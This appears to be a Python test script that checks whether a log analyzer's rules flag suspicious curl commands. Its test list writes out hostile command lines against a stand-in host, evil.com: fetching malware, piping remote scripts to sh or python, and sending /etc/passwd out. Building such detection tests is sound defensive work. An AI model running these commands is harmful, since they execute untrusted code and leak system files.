"""
Test script specifically for curl-related rules
"""

import pandas as pd
from log_analyzer import make_analyzer, load_rules
from threat_intel import ThreatIntelligenceProvider

def test_curl_rules():
    print("🧪 Testing CURL Rules")
    print("="*50)
    
    # Load rules
    rules_data = load_rules("rules.json")
    analyze_command = make_analyzer(rules_data)
    
    # Initialize threat intelligence
    threat_intel_provider = ThreatIntelligenceProvider()
    threat_intel_provider.load_mitre_mappings()
    
    # Test cases for curl commands
    curl_test_cases = [
        # Basic file downloads
        "curl -o malware.exe http://evil.com/malware.exe",
        "curl -O https://evil.com/backdoor.sh",
        "curl https://evil.com/payload -o /tmp/payload",
        
        # HTTP methods
        "curl -X POST http://evil.com/api",
        "curl -X PUT http://evil.com/data",
        "curl -X DELETE http://evil.com/resource",
        
        # Data upload
        "curl -d 'username=admin&password=pwd' http://evil.com/login",
        "curl -d @file.txt http://evil.com/upload",
        "curl -d @/etc/passwd http://evil.com/exfil",
        
        # Authentication
        "curl -u admin:password http://internal.com/admin",
        "curl -H 'Authorization: Bearer token123' http://api.com/data",
        "curl -H 'Cookie: sessionid=abc123' http://site.com/profile",
        
        # Security flags
        "curl -k https://self-signed.com/file",
        "curl --insecure https://expired-cert.com/data",
        "curl -L http://redirect.com",
        
        # Direct execution
        "curl http://evil.com/script.sh | sh",
        "curl http://evil.com/malware.py | python",
        "curl http://evil.com/tool.js | node",
        
        # Silent downloads
        "curl -sSL https://get.docker.com | sh",
        "curl -s https://install-script.com/setup | bash",
        
        # Specific file types
        "curl -O http://repo.com/software.exe",
        "curl -O http://scripts.com/installer.msi",
        "curl -O http://tools.com/backdoor.dll",
        "curl -O http://scripts.com/exploit.bat",
        "curl -O http://scripts.com/malware.ps1",
        "curl -O http://scripts.com/backdoor.vbs",
        "curl -O http://packages.com/app.deb",
        "curl -O http://packages.com/tool.rpm",
        "curl -O http://mobile.com/app.apk",
        "curl -O http://mac.com/installer.dmg",
        "curl -O http://mac.com/package.pkg"
    ]
    
    print(f"Testing {len(curl_test_cases)} curl command samples...")
    print()
    
    matched_count = 0
    for i, command in enumerate(curl_test_cases, 1):
        result = analyze_command(command)
        if result != "Unknown Activity":
            matched_count += 1
            # Apply threat intelligence enrichment
            enriched_result = threat_intel_provider.enrich_analysis_result(result)
            print(f"{i:2d}. ✓ {command}")
            print(f"    → {enriched_result}")
        else:
            print(f"{i:2d}. ○ {command}")
            print(f"    → {result}")
        print()
    
    print("="*50)
    print(f"SUMMARY: {matched_count}/{len(curl_test_cases)} curl commands matched ({matched_count/len(curl_test_cases)*100:.1f}%)")
    
    if matched_count == len(curl_test_cases):
        print("🎉 All curl test cases matched! Curl ruleset validation successful.")
    else:
        print(f"⚠️  {len(curl_test_cases) - matched_count} curl commands were not matched by any rule.")

if __name__ == "__main__":
    test_curl_rules()